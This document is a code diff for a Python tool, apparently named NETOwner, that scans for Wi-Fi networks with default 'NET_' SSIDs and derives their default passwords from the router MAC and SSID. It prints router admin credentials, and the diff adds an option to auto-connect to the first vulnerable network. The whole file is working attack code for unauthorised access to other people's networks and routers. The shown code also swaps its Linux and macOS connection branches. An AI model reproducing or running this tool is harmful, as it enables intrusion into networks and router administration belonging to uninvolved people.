@@ -1,4 +1,4 @@
-import subprocess , argparse , sys
+import subprocess, argparse, sys
 from re import compile
 from wifi import Cell, Scheme
 
@@ -12,20 +12,20 @@ AIRPORT_PATH = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/
 
 
 class NETOwner():
-    def __init__(self, iface, regex='^NET_',
+    def __init__(self, iface, connect=False, regex="^NET_",
                  airport=AIRPORT_PATH, verbosity=0):
         self.iface = iface
+        self.connect = connect
         self.regex = compile(regex)
         self.airport = airport
         self.verbosity = verbosity
         self.os = sys.platform
 
     def osx_networks(self):
-        scan = ''
-        while scan == '':  # for some reason airport fails randomly
+        scan = ""
+        while scan == "":  # for some reason airport fails randomly
             scan = subprocess.check_output([self.airport, "scan"]).decode()
             # scan the area for wifi
-
         scan = scan.split("\n")
 
         for wifi in scan:
@@ -42,17 +42,17 @@ class NETOwner():
 
     def scan_network(self):
         if self.os == "linux" or self.os == "linux2":
-           scanner = self.linux_networks()
+            scanner = self.linux_networks()
         elif self.os == "darwin":
-           scanner = self.osx_networks()
-        #elif os == "win32":
-            
+            scanner = self.osx_networks()
+        # elif os == "win32":
+
         results = []
         for wifi in scanner:
             if self.verbosity > 1:
                 print(wifi)
 
-            # match NET's default SSID
+            # match NET"s default SSID
             if self.regex.search(wifi[0]) is not None:
                 print("Found WIFI!")
                 # the password consists of CM_MAC last 4 hexas of the router,
@@ -60,14 +60,14 @@ class NETOwner():
                 # plus the last 3 hexas of the SSID
 
                 chunks = [
-                    ''.join(wifi[1].upper().split(":")[2:3]),
+                    "".join(wifi[1].upper().split(":")[2:3]),
                     wifi[0].split("_")[1][2:]
                 ]
 
-                password = ''.join(chunks)
+                password = "".join(chunks)
                 results.append([wifi[0], password, wifi[1]])
 
-                if self.os != 'darwin':
+                if self.os != "darwin":
                     Scheme.for_cell(
                         self.iface, wifi[1], wifi[4], password
                     ).save()
@@ -76,10 +76,10 @@ class NETOwner():
 
     def connect_net(self, wifi):
         if self.os == "linux" or self.os == "linux2":
-           status = self.connect_net_osx(wifi)
+            status = self.connect_net_osx(wifi)
         elif self.os == "darwin":
-           status = self.connect_net_linux(wifi)
-        #elif os == "win32":
+            status = self.connect_net_linux(wifi)
+        # elif os == "win32":
 
         return status
 
@@ -103,21 +103,24 @@ class NETOwner():
         if len(wifi_available) == 0:
             print("No NET WiFi available :'(")
         else:
+            connected = False
             for wifi in wifi_available:
                 print("WI-FI: " + wifi[0])
                 print("Password: " + wifi[1])
-                print("Trying to connect...")
-                if self.connect_net(wifi):
-                    print("Connected! Have fun (:")
-                    if self.verbosity > 0:
-                        print("Admin credentials of the router: ")
-                        print("User: " + wifi[0])
-                        print("Password: NET_" + wifi[1][2:])
-                        # the password is the full CM_MAC
-                        print("Yeah, I know...")
-                    return
-                else:
-                    print("Nope :(")
+                if self.verbosity > 0:
+                    print("Admin credentials of the router: ")
+                    print("User: " + wifi[0])
+                    print("Password: NET_" + wifi[1][2:])
+                    # the password is the full CM_MAC
+                    print("Yeah, I know...")
+
+                if not connected and self.connect:
+                    print("Trying to connect...")
+                    if self.connect_net(wifi):
+                        print("Connected! Have fun (:")
+                        connected = True
+                    else:
+                        print("Nope :(")
 
 
 def parse_args():
@@ -127,6 +130,8 @@ def parse_args():
 
     parser.add_argument("-i", "--interface", default="wlp3s0",
                         help="Network interface.")
+    parser.add_argument("-c", "--connect", action="store_true", default=False,
+                        help="Autoconnect to the first vulnerable network.")
     parser.add_argument("-r", "--regex", default="^NET_",
                         help="Regular expression to match networks.")
     parser.add_argument("-a", "--airport", default=AIRPORT_PATH,
@@ -146,6 +151,7 @@ def main():
 
     owner = NETOwner(
         args.interface,
+        connect=args.connect,
         regex=args.regex,
         airport=args.airport,
         verbosity=args.verbosity or 0
